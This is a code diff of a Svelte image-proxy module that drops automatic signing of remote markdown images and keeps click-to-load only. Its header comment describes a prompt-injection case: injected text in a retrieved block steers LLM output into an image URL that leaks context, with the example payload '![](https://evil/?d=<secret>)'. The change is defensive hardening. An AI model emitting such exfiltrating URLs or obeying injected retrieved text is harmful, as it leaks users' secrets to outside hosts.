@@ -1,29 +1,28 @@
-// Camo post-render pass (design 07-camo §4.3, D2b) as Svelte actions, shared by
+// Camo post-render pass (design 07-camo §4.3, D2b) as a Svelte action, shared by
 // EVERY renderMarkdown sink (Markdown.svelte for issues/comments, MessageBubble
 // for chat streaming) so the "one markdown path" invariant (design 04 §9.6)
 // extends to image proxying: one place mints proxy <img>, not one per surface.
 //
 // The renderer leaves foreign remote images as span.md-img-blocked[data-camo-src]
-// placeholders (markdown.ts). Two actions turn them into proxied same-origin
-// <img src="/api/img/…"> (allowed by img-src 'self' — the CSP never changes):
-//
-//  - camoProxy (issue/comment markdown): collects the placeholders after each
-//    render, batch-signs their URLs via POST /api/img/sign (origin "issue") and
-//    swaps each signed one. Foreign text, but no model in the loop.
-//  - camoClickToLoad (chat assistant turns): signs NOTHING on render. LLM output
-//    can be steered by injected text in a retrieved block into an image URL that
-//    carries context (`![](https://evil/?d=<secret>)`); a sign on render would
-//    make the server fetch it without anyone looking (GHSA 2026-10-31 §7). Each
-//    placeholder instead shows the target host + a shortened path and a "Load
-//    image" button; one click signs exactly that one URL (origin "assistant").
-//    Approved URLs are remembered for the page session, so the re-renders of a
-//    streaming or re-mounted message swap them again without another click.
+// placeholders (markdown.ts). camoClickToLoad turns them into proxied same-origin
+// <img src="/api/img/…"> (allowed by img-src 'self' — the CSP never changes),
+// but only on a click, and it signs NOTHING on render. A signed URL is fetched
+// by the server, so every byte of it reaches the foreign host; signing on render
+// would make the server fetch it without anyone looking. No markdown surface is
+// trusted enough for that: LLM output can be steered by injected text in a
+// retrieved block into an image URL that carries context
+// (`![](https://evil/?d=<secret>)`, GHSA 2026-10-31 §7), and issue / comment
+// bodies are written by agents through MCP, `ctx manage` and REST with the same
+// api-key auth as the web UI (security review 2026-10-31 §E). Each placeholder
+// instead shows the target host + a shortened path and a "Load image" button;
+// one click signs exactly that one URL, declared as origin "assistant", which
+// the server signs one URL at a time. Approved URLs are remembered for the page
+// session, so the re-renders of a streaming or re-mounted message swap them
+// again without another click.
 //
 // Fail-safe by construction: the placeholder is the default and the fallback. A
 // disabled proxy, a sign failure, or a URL the server declines all leave the
-// visible placeholder in place — the swap is purely additive. A per-run token
-// discards a stale async response so a fast re-render never swaps against a
-// superseded document.
+// visible placeholder in place — the swap is purely additive.
 
 import { signImages } from '../api/images'
 
@@ -34,9 +33,9 @@ const PLACEHOLDER = 'span.md-img-blocked[data-camo-src]'
 const MAX_PATH_LEN = 512
 const SHOWN_PATH_LEN = 48
 
-/** Viewer-approved assistant images of this page session: url → proxy path. */
+/** Viewer-approved images of this page session: url → proxy path. */
 const approved = new Map<string, string>()
-/** Assistant image URLs whose click-sign is in flight. */
+/** Image URLs whose click-sign is in flight. */
 const pending = new Set<string>()
 
 function swapToImg(ph: HTMLElement, proxied: string): void {
@@ -52,35 +51,6 @@ function swapToImg(ph: HTMLElement, proxied: string): void {
 
 function placeholdersIn(node: HTMLElement): HTMLElement[] {
   return Array.from(node.querySelectorAll<HTMLElement>(PLACEHOLDER))
-}
-
-export function camoProxy(node: HTMLElement, _content?: unknown) {
-  let token = 0
-
-  function run() {
-    const placeholders = placeholdersIn(node)
-    if (placeholders.length === 0) return
-    const current = ++token
-    const urls = placeholders.map((p) => p.getAttribute('data-camo-src') ?? '')
-    void signImages(urls, 'issue').then((sigs) => {
-      if (current !== token) return // superseded by a newer render
-      if (!node.isConnected) return
-      for (const ph of placeholders) {
-        if (!ph.isConnected) continue
-        const proxied = sigs[ph.getAttribute('data-camo-src') ?? '']
-        if (!proxied) continue // declined / proxy off → keep the placeholder
-        swapToImg(ph, proxied)
-      }
-    })
-  }
-
-  run()
-  return {
-    // Re-run after the {@html} content changes (the bound param is the html).
-    update() {
-      run()
-    },
-  }
 }
 
 /**
